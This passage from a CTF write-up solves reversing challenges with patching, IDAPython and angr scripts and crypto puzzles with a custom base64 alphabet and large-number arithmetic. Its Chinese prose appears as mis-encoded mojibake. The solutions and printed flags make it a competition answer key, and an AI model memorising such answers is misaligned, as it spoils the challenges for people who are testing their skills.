·ç›´æ¥ä»IDAçœ‹çš„è¯åº”è¯¥çœ‹ä¸å‡ºä»€ä¹ˆæ¥ï¼Œæƒ³åˆ†æè¿™é‡Œçš„è¯éœ€è¦æˆ‘ä»¬è‡ªå·±ä¸€æ­¥æ­¥çš„æ¥ç®€åŒ–è¿™äº›ä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿ï¼ˆä¿—ç§°å°±æ˜¯äººèƒ½çœ‹XDï¼‰ä¸è¿‡è¿™ä¸ªé¢˜ä¸ç®€åŒ–è¿™é‡Œä¸€æ ·å¯ä»¥å†™ï¼Œæ‰€ä»¥è¿™ä¸ªç®€åŒ–æ–¹å¼ç•™åˆ°å¼€å­¦ä¹‹åçœ‹èƒ½ä¸èƒ½å†è·Ÿä½ ä»¬çº¿ä¸‹è®²å§â€¦.æˆªå›¾ä»€ä¹ˆçš„å¤ªéº»çƒ¦äº†ï¼Œè¿™é‡Œæ”¾å‡ å¼ æ•ˆæœå›¾</p><p><img src="https://s1.ax1x.com/2020/03/30/GnWH7F.png" alt="GnWH7F.png"></p><p><img src="https://s1.ax1x.com/2020/03/30/GnWKY9.png" alt="GnWKY9.png"></p><p><img src="https://s1.ax1x.com/2020/03/30/GnWmo4.png" alt="GnWmo4.png"></p><p><strong>type1</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/GnWuFJ.png" alt="GnWuFJ.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªé€’å½’å‡½æ•°ï¼Œå¦‚æœå†™è¿‡æ•°æ®ç»“æ„æ ‘éå†çš„è¯è‚¯å®šç‰¹åˆ«ç†Ÿæ‚‰ï¼Œè¿™ä¸ªæ˜¯ä¸­æ ¹éå†çš„é€’å½’ç®—æ³•</p><p><strong>type2</strong></p><p>åŒæ ·å¦‚æœå¯¹æ•°æ®ç»“æ„æ ‘éå†ç†Ÿæ‚‰çš„è¯å¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªæ˜¯åæ ¹éå†çš„é€’å½’ç®—æ³•</p><p><img src="https://s1.ax1x.com/2020/03/30/GnWMWR.png" alt="GnWMWR.png"></p><p>æ‰€ä»¥flagå°±è‚¯å®šæ˜¯å…ˆæ ¹éå†å¾—åˆ°çš„å­—ç¬¦ä¸²äº†ï¼Œå¯ä»¥å»ç½‘ä¸Šå­¦ä¸€ä¸‹æ ‘çš„ä¸‰ç§éå†ä¸­å¦‚ä½•æ ¹æ®å…¶ä¸­ä¸¤ç§éå†å¾—åˆ°å¦å¤–ä¸€ç§ï¼Œå¥½åƒè¿˜æ˜¯ä¸€ä¸ªé¢è¯•é¢˜æ¥ç€ï¼Ÿä¸è¿‡æˆ‘æ„Ÿè§‰èƒ½getåˆ°çš„è¯å°±å¾ˆå¥½ç†è§£ï¼Œè¿™é‡Œå¤åŸçš„æ—¶å€™å”¯ä¸€ä¸€ä¸ªå¯èƒ½ä¼šå¡å£³çš„å°±æ˜¯åœ¨å¤åŸæ ¹èŠ‚ç‚¹å³å­æ ‘çš„æ—¶å€™æœ‰ä¸¤ä¸ª<code>_</code>ï¼Œè¦ç¨å¾®æ³¨æ„ä¸€ä¸‹è§„å¾‹</p><p>psï¼šä¸€èˆ¬æ¥è¯´çš„è¯å¦‚æœæ¶‰åŠåˆ°æ•°æ®ç»“æ„çš„é€†å‘é¢˜ï¼Œè‚¯å®šä¸ä¼šåƒæˆ‘è¿™æ ·æŠŠä¸¤ç§éå†éƒ½ç»™å‡ºæ¥çš„â€¦.å¯èƒ½å°±ç›´æ¥ä¸€ä¸ªè£¸çš„ç¨‹åºç»™ä½ è®©ä½ å»æ‰¾flagï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™å°±è¦å­¦ä¼šå†™è„šæœ¬orè°ƒè¯•ç¡¬åˆšï¼Œè¿™ä¸ªé¢˜ä¸»è¦è¿˜æ˜¯å¸Œæœ›èƒ½è®©ä½ ä»¬ç†Ÿæ‚‰æ ‘æˆ–å…¶ä»–æ•°æ®ç»“æ„åº”è¯¥æ€ä¹ˆæ¥åˆ†æ&amp;è¿™äº›æ•°æ®ç»“æ„åœ¨åº•å±‚æ˜¯æ€ä¹ˆå­˜å‚¨çš„</p><p>å¦‚æœæ ‘å¤ªå¤§çš„æƒ…å†µä¸‹è¿˜å¯ä»¥ç›´æ¥å»ç¡¬åˆšæ±‡ç¼–ï¼Œå› ä¸ºè¿™ä¸¤ä¸ªé€’å½’å‡½æ•°æŒ‡ä»¤æ•°é‡éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯é¡ºåºä¸åŒè€Œå·²ï¼Œç”¨ä¸‹é¢è¿™ä¸ªIDCè„šæœ¬æŠŠtype2çš„æŒ‡ä»¤é¡ºåºäº¤æ¢ä¸€ä¸‹ï¼ˆæŠŠputcharæ”¾åˆ°å‰é¢å»ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">auto</span> address1=<span class="hljs-number">0x4007CA</span>;<br>    <span class="hljs-keyword">auto</span> address2=<span class="hljs-number">0x4007EA</span>;<br>    <span class="hljs-keyword">auto</span> address3=<span class="hljs-number">0x4007FB</span>;<br>    <span class="hljs-keyword">auto</span> code1=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">auto</span> i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-keyword">for</span>(i=address1;i&lt;address2;i++)<br>    &#123;<br>    code1=code1+Byte(i);<br>    &#125;<br><br>    j=address1;<br>    <span class="hljs-keyword">for</span>(i=address2;i&lt;address3;i++)<br>    &#123;<br>        PatchByte(j++,Byte(i));<br>    &#125;<br>        <br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">strlen</span>(code1);i++)<br>    &#123;<br>        PatchByte(j++,ord(code1[i]));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†æŠŠcallæŒ‡ä»¤çš„åç§»ç”¨keypatchæ”¹æ”¹å°±å¥½äº†ï¼Œå¼ºè¡Œæ”¹æˆå…ˆæ ¹éå†ï¼Œæ•ˆæœå›¾<br><img src="https://s1.ax1x.com/2020/03/30/GuC2sP.png" alt="GuC2sP.png"></p><p>æ‰§è¡Œå°±æœ‰flag</p><p><img src="https://s1.ax1x.com/2020/03/30/GuCgMt.png" alt="GuCgMt.png"></p><h2 id="funnyre-7-solves"><a href="#funnyre-7-solves" class="headerlink" title="funnyre - 7 solves"></a>funnyre - 7 solves</h2><blockquote><p>Author: Tsiao</p><p>å½“æˆ‘è·Ÿå¯å¥¡èŠåˆ°å‡ºé¢˜çš„æ—¶å€™ï¼Œä»–å¾ˆçƒ­æƒ…åœ°åœ¨ç™¾å¿™ä¸­æŠ½ç©ºç»™æˆ‘å‡ºäº†ä¸€é“é¢˜ï¼Œæˆ‘è§‰å¾—å¦‚æœä¸–ä¸Šè¿˜æœ‰é›·é”‹ï¼Œæˆ‘è§‰å¾—ä¸€å®šä¼šæ˜¯ Tsiaoã€‚</p></blockquote><p>è€ƒå¯Ÿï¼š</p><p>1ã€ ç®€å•èŠ±æŒ‡ä»¤çš„å»é™¤</p><p>2ã€ åœ¨æœ‰é™åŸŸä¸Šè¿ç®—çš„ç®€åŒ–</p><p>é¦–å…ˆå»é™¤èŠ±æŒ‡ä»¤ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">ads = <span class="hljs-number">0x4005B0</span><br><br>end = <span class="hljs-number">0x401DC0</span><br><br>codes = get_bytes(ads, end-ads)<br><br>codes = codes.replace(<span class="hljs-string">&quot;\x74\x03\x75\x01\xe8\x90&quot;</span>, <span class="hljs-string">&quot;\x90\x90\x90\x90\x90\x90&quot;</span>)<br><br>patch_bytes(ads, codes)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] patch ok&quot;</span><br></code></pre></td></tr></table></figure><p> éšåå¯ä»¥çœ‹åˆ°é€»è¾‘ï¼Œè¿›è¡Œäº†æ•°æ¬¡xoræ“ä½œï¼Œåˆè¿›è¡Œäº†æ•°æ¬¡ç§»ä½æ“ä½œï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨IDAPythonè·å–æ¯ä¸€ä¸ªæ“ä½œçš„è¯¦ç»†æ•°æ®ï¼Œç„¶ååŒ–ç®€ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨angrè¿›è¡Œæš´åŠ›æ±‚è§£ã€‚</p><p>è§£æ³•ä¸€ï¼šæš´åŠ›æ±‚è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">dt = [<span class="hljs-number">0xd9</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x2a</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">kaisa</span>(<span class="hljs-params">xx, kk</span>):<br>    <span class="hljs-keyword">return</span> [(x+kk) &amp; <span class="hljs-number">0xFF</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xx]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">xx, kk</span>):<br>    <span class="hljs-keyword">return</span> [x ^ kk <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xx]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">xx</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xx:<br>        <span class="hljs-keyword">if</span> x &lt; <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;0&#x27;</span>) <span class="hljs-keyword">or</span> (x &gt; <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;9&#x27;</span>) <span class="hljs-keyword">and</span> x &lt; <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)) <span class="hljs-keyword">or</span> x &gt; <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;f&#x27;</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">for</span> k1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br>        tt = kaisa(dt, k1)<br>        <span class="hljs-keyword">for</span> k2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br>            tt2 = xor(tt, k2)<br>            <span class="hljs-keyword">if</span> check(tt2):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(tt2))<br>                <span class="hljs-built_in">print</span>(k1, k2)<br></code></pre></td></tr></table></figure><p>è§£æ³•äºŒï¼šIDAPythonæ ¹æ®æŒ‡ä»¤å»é€†å‘ï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">def trans(xx, kk):<br>    return [(x-kk) &amp; <span class="hljs-number">0xFF</span> for x <span class="hljs-keyword">in</span> xx]<br>def <span class="hljs-keyword">xor</span>(xx, kk):<br>    return [x^kk for x <span class="hljs-keyword">in</span> xx]<br>def not_(xx):<br>    return [~x for x <span class="hljs-keyword">in</span> xx]<br><br><span class="hljs-built_in">dt</span> = [<span class="hljs-number">0xd9</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x2a</span>]<br><br>ads = <span class="hljs-number">0x4005B0</span><br>end = <span class="hljs-number">0x401DC0</span><br>i = PrevHead(end)<br>while i &gt; ads:<br>    if GetMnem(i) == <span class="hljs-string">&#x27;xor&#x27;</span> <span class="hljs-keyword">and</span> GetOpnd(i, <span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;byte ptr [rdx+rax+5]&#x27;</span>:<br>        k = <span class="hljs-keyword">int</span>(GetOpnd(i, <span class="hljs-number">1</span>).rstrip(<span class="hljs-string">&#x27;h&#x27;</span>), <span class="hljs-number">16</span>)<br>        <span class="hljs-built_in">dt</span> = <span class="hljs-keyword">xor</span>(<span class="hljs-built_in">dt</span>, k)<br>        print(<span class="hljs-string">&quot;xor: &#123;&#125;&quot;</span>.format(k))<br>    if GetMnem(i) == <span class="hljs-string">&#x27;add&#x27;</span> <span class="hljs-keyword">and</span> GetOpnd(i, <span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;byte ptr [rdx+rax+5]&#x27;</span>:<br>        k = <span class="hljs-keyword">int</span>(GetOpnd(i, <span class="hljs-number">1</span>).rstrip(<span class="hljs-string">&#x27;h&#x27;</span>), <span class="hljs-number">16</span>)<br>        <span class="hljs-built_in">dt</span> = trans(<span class="hljs-built_in">dt</span>, k)<br>        print(<span class="hljs-string">&quot;trans: &#123;&#125;&quot;</span>.format(k))<br>    if GetMnem(i) == <span class="hljs-string">&#x27;not&#x27;</span> <span class="hljs-keyword">and</span> GetOpnd(i, <span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;byte ptr [rdx+rax+5]&#x27;</span>:<br>        <span class="hljs-built_in">dt</span> = not_(<span class="hljs-built_in">dt</span>)<br>        print(<span class="hljs-string">&quot;not: &#123;&#125;&quot;</span>.format(k))<br>    i = PrevHead(i)<br><br>print(<span class="hljs-built_in">dt</span>) <br></code></pre></td></tr></table></figure><p>è§£æ³•ä¸‰ï¼šç¬¦å·æ‰§è¡Œå·¥å…·çº¦æŸæ±‚è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br>p = angr.Project(<span class="hljs-string">&quot;./funre&quot;</span>, load_options=&#123;<span class="hljs-string">&quot;auto_load_libs&quot;</span>: <span class="hljs-literal">False</span>&#125;)<br>f = p.factory<br>state = f.entry_state(addr=<span class="hljs-number">0x400605</span>)<br>flag = claripy.BVS(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-number">8</span>*<span class="hljs-number">32</span>)<br>state.memory.store(<span class="hljs-number">0x603055</span>+<span class="hljs-number">0x300</span>+<span class="hljs-number">5</span>, flag)<br>state.regs.rdx = <span class="hljs-number">0x603055</span>+<span class="hljs-number">0x300</span><br>state.regs.rdi = <span class="hljs-number">0x603055</span>+<span class="hljs-number">0x300</span>+<span class="hljs-number">5</span><br><br>sm = p.factory.simulation_manager(state)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] init ok&quot;</span>)<br><br>sm.explore(find=<span class="hljs-number">0x401DAE</span>)<br><span class="hljs-keyword">if</span> sm.found:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] found!&quot;</span>)<br>    x = sm.found[<span class="hljs-number">0</span>].solver.<span class="hljs-built_in">eval</span>(flag, cast_to=<span class="hljs-built_in">bytes</span>)<br>    <span class="hljs-built_in">print</span>(x)<br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/03/30/GnNG4g.png" alt="GnNG4g.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="å¤§æ•°è¿ç®—-55-solves"><a href="#å¤§æ•°è¿ç®—-55-solves" class="headerlink" title="å¤§æ•°è¿ç®— - 55 solves"></a>å¤§æ•°è¿ç®— - 55 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>é¢˜ç›®ï¼š</p><blockquote><p>flagç­‰äº wctf2020{Part1-Part2-Part3-Part4} æ¯ä¸€Partéƒ½ä¸ºæ•°çš„åå…­è¿›åˆ¶å½¢å¼ï¼ˆä¸éœ€è¦0x)ï¼Œå¹¶ç”¨ â€˜-â€˜ è¿æ¥<br>Part1 &#x3D; <code>2020*2019*2018* ... *3*2*1</code> çš„å‰8ä½<br>Part2 &#x3D; <code>520^1314 + 2333^666</code> çš„å‰8ä½<br>Part3 &#x3D; å®‡å®™ç»ˆæé—®é¢˜çš„ç­”æ¡ˆ x, y, zç»å¯¹å€¼å’Œçš„å‰8ä½<br>Part4 &#x3D; è§å›¾ç‰‡é™„ä»¶ï¼Œè®¡ç®—ç»“æœä¹˜ä¸Š1314</p></blockquote><p><img src="https://s1.ax1x.com/2020/03/29/GVYCUs.jpg" alt="GVYCUs.jpg"></p><p>è¿™ä¸ªå°±æ˜¯è€ƒå¯ŸèŒæ–°çš„ Python èƒ½åŠ›ï¼Œç›´æ¥ç”¨ Python ç®—å°±å¯ä»¥äº†ã€‚</p><p>è´´ä¸€ä¸‹exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment"># part1</span><br>cnt = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2021</span>):<br>cnt *= i<br>Part1 = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(cnt)[:<span class="hljs-number">8</span>])))[<span class="hljs-number">2</span>:]<br><span class="hljs-comment"># ä¸è¦0x</span><br><br><span class="hljs-comment"># part2</span><br>cnt = <span class="hljs-number">520</span> ** <span class="hljs-number">1314</span> + <span class="hljs-number">2333</span> ** <span class="hljs-number">666</span><br>Part2 = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(cnt)[:<span class="hljs-number">8</span>])))[<span class="hljs-number">2</span>:]<br><br><span class="hljs-comment"># part3</span><br><span class="hljs-comment"># å®‡å®™ç»ˆæé—®é¢˜çš„ç­”æ¡ˆï¼ŒGoogleä¸€ä¸‹å‰å‡ æ¡å°±æœ‰ï¼Œå–x, y, z</span><br><span class="hljs-comment"># 42 =ï¼ˆ-80538738812075974ï¼‰^3 + 80435758145817515^3 + 12602123297335631^3</span><br>cnt = <span class="hljs-number">80538738812075974</span> + <span class="hljs-number">80435758145817515</span> + <span class="hljs-number">12602123297335631</span><br>Part3 = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(cnt)[:<span class="hljs-number">8</span>])))[<span class="hljs-number">2</span>:]<br><br><span class="hljs-comment"># part4</span><br><span class="hljs-comment"># è¿™æ˜¯å®šç§¯åˆ†ï¼Œæ¯”è¾ƒç®€å•ï¼Œå›¾æ˜¯å«–çš„ï¼Œç®—å‡ºæ¥ç»“æœæ˜¯520(æ€ä¹ˆé‚£ä¹ˆå¤šéªšä¸œè¥¿)</span><br>cnt = <span class="hljs-number">520</span> * <span class="hljs-number">1314</span><br>Part4 = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(cnt)[:<span class="hljs-number">8</span>])))[<span class="hljs-number">2</span>:]<br><br>flag = <span class="hljs-string">&#x27;wctf2020&#123;%s-%s-%s-%s&#125;&#x27;</span> % (Part1, Part2, Part3, Part4)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="B-se-37-solves"><a href="#B-se-37-solves" class="headerlink" title="B@se - 37 solves"></a>B@se - 37 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>é¢˜ç›®ï¼š</p><blockquote><p>JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs****kxyz012789+&#x2F;</p><p>oh holy shit, something is missingâ€¦</p></blockquote><p>æ¢è¡¨çš„ base64 å¤ªå¸¸è§äº†ï¼Œåšäº†ä¸€ç‚¹ç‚¹æ”¹åŠ¨ï¼Œå…¨æ’åˆ—å°±24ç§ã€‚</p><p>å¯†æ–‡ï¼š</p><blockquote><p>MyLkTaP3FaA7KOWjTmKkVjWjVzKjdeNvTnAjoH9iZOIvTeHbvD&#x3D;&#x3D;</p></blockquote><p>æˆ‘ç”¨äº† itertools æ¨¡å—ï¼Œexpï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> itertools<br><br><br><span class="hljs-comment"># 34uj</span><br>string1 = <span class="hljs-string">&quot;JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs****kxyz012789+/&quot;</span><br>string2 = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><br>enc = <span class="hljs-string">&#x27;MyLkTaP3FaA7KOWjTmKkVjWjVzKjdeNvTnAjoH9iZOIvTeHbvD==&#x27;</span><br><br>miss = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string2:<br><span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> string1:<br>miss.append(i)<br><br>ob = itertools.permutations(miss, <span class="hljs-number">4</span>)<br>tb = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ob:<br>tmp = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>tmp += j<br>tb.append(tmp)<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> tb:<br>string1 = <span class="hljs-string">&quot;JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs&quot;</span> + x + <span class="hljs-string">&quot;kxyz012789+/&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc:<br><span class="hljs-keyword">if</span> i != <span class="hljs-string">&#x27;=&#x27;</span>:<br>index = string1.find(i)<br>flag += string2[index]<br><span class="hljs-keyword">else</span>:<br>flag += <span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-keyword">try</span>:<br>flag = base64.b64decode(flag).decode()<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wctf2020&#x27;</span> <span class="hljs-keyword">in</span> flag:<br><span class="hljs-built_in">print</span>(flag)<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>è·‘å‡ºæ¥æœ‰ä¸€äº›æ˜¯ä¸å¯è§å­—ç¬¦ï¼Œæœ‰ä¸€äº›æ˜¯ä¸æ€ä¹ˆå¯¹çš„ï¼Œä½†å¯è§å­—ç¬¦å°±ä¸¤ç§æƒ…å†µï¼Œflag æ˜¯æœ‰æ„ä¹‰çš„è‹±æ–‡å•è¯ï¼Œæ‰€ä»¥æ‰¾é‚£ä¸ªæœ€åƒçš„å°±å¯ä»¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">wctf2020&#123;bare64_!r_v2ry_e@ry_and_fuN&#125;<br>wctf2020&#123;base64_1s_v3ry_e@sy_and_fuN&#125;<br>wctf2020&#123;bare64_!r_v2ry_e@ry_and_fuN&#125;<br>wctf2020&#123;base64_1s_v3ry_e@sy_and_fuN&#125;<br>[Finished <span class="hljs-keyword">in</span> <span class="hljs-number">0.2</span>s]<br></code></pre></td></tr></table></figure><p>æ­£è§£ï¼š 